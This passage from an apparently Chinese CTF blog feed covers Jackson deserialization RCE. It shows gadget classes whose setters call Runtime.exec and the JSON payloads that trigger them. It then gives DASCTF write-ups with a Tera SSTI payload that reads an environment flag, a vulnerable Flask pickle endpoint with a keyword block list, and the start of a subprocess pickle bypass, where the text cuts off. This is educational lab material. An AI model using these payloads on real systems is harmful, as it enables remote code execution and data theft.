function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.getSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.setSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person3类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写反序列化类，构造 Payload</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationRun</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"sex\":[\"MySex\",&#123;\"sex\":1&#125;]&#125;"</span><span class="token punctuation">;</span>          <span class="token class-name">Person3</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person3</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225003715010.png" alt="image-20241225003715010"></p><hr><h2 id="属性为Object类时"><a href="#属性为Object类时" class="headerlink" title="属性为Object类时"></a>属性为Object类时</h2><p>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</p><p>Evil：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person4：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">// @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>    <span class="token comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 setter 函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationObjectRun</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"object\":[\"Evil\",&#123;\"cmd\":\"calc\"&#125;]&#125;"</span><span class="token punctuation">;</span>        <span class="token class-name">Person4</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person4</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225004159668.png" alt="image-20241225004159668"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学期初爽学一次Java，学期末再爽学一次Java😋&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&quot;&gt;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&quot;&gt;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/27/Jackson/&quot;&gt;https://zer0peach.github.io/2023/09/27/Jackson/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF x 0psu3 2024最后一战</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/</id>
    <published>2024-12-21T01:57:00.000Z</published>
    <updated>2025-02-02T15:19:50.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时隔一年，这次连签到都差点做不来了</p><p>唉唉web又爆零了，埋了，得了一种打 DAS 就做不动题的病</p><p>等期末考完再复现，要被期末考薄纱了😭</p><p>参考：</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#</a></p><p><a href="https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/">https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/</a></p><span id="more"></span><hr><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><blockquote><p>请仔细观察这个链接，会先到 <a href="http://game.wetolink.com/">game.wetolink.com</a>，那么，稍微扫描一下能有什么发现呢？</p></blockquote><p>公网 https 我哪敢直接扫啊（</p><p>它给的网站并非真实的报名网站</p><p>扫一下发现有robots.txt</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170034012.png" alt="image-20241221170034012"></p><hr><h1 id="西湖论剑邀请函获取器"><a href="#西湖论剑邀请函获取器" class="headerlink" title="西湖论剑邀请函获取器"></a>西湖论剑邀请函获取器</h1><blockquote><p>提交截图那里，队名好像可以 81 ？但好像不是 Python 写的，是 Rust 吗（喜）；不用RCE，拿到环境变量FLAG的内容即可。</p></blockquote><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170314887.png" alt="image-20241221170314887"></p><p>有ssti</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171013243.png" alt="image-20241221171013243"></p><p>浅浅测一下发现确实是 tera 模板，此事在<a href="https://c1oudfl0w0.github.io/blog/2024/10/21/2024%E4%B8%89%E5%B3%A1%E6%9D%AF/#textme">三峡杯初赛</a>中亦有记载</p><p>无过滤那就直接读</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token function">get_env</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171243779.png" alt="image-20241221171243779"></p><hr><h1 id="const-python（复现）"><a href="#const-python（复现）" class="headerlink" title="const_python（复现）"></a>const_python（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>jsonify<span class="token punctuation">,</span>session<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> auth<span class="token operator">=</span><span class="token string">'ctfer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>auth <span class="token operator">=</span> authpassword <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>Admin <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Welcome to my application"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token punctuation">:</span>            <span class="token keyword">if</span> password <span class="token operator">==</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">:</span>                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span>                <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Invalid Credentials"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''        &lt;form method="post">        &lt;!-- /src may help you>            Username: &lt;input type="text" name="username">&lt;br>            Password: &lt;input type="password" name="password">&lt;br>            &lt;input type="submit" value="Login">        &lt;/form>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ppicklee'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ppicklee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>                 <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span>  <span class="token string">'pickle'</span><span class="token punctuation">,</span><span class="token string">"class"</span><span class="token punctuation">,</span><span class="token string">"mro"</span><span class="token punctuation">,</span><span class="token string">"flask"</span><span class="token punctuation">,</span><span class="token string">"sys"</span><span class="token punctuation">,</span><span class="token string">"base"</span><span class="token punctuation">,</span><span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"session"</span><span class="token punctuation">&#125;</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> pickle_data<span class="token punctuation">:</span>                <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token string">" waf !!!!!!!"</span>        pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"success pickle"</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fail pickle"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">'You are not admin!'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag路径已知在&#x2F;flag，根本逻辑就是 pickle 绕 waf 打文件包含</p><p>值得注意的是开头引入了 builtins 和 io 两个库</p><p>观察一下waf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span><span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span><span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"flask"</span><span class="token punctuation">,</span> <span class="token string">"sys"</span><span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"session"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>观察一下，引入的库里也就 builtins 和 io 没被ban</p> <br><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>想了半天怎么用它给的 io 把读取的文件对象带出来，结果直接用<code>subprocess</code>库 cp 到 app.py 就行了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> subprocess  <span class="token keyword">class</span> <span class="token class-name">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token 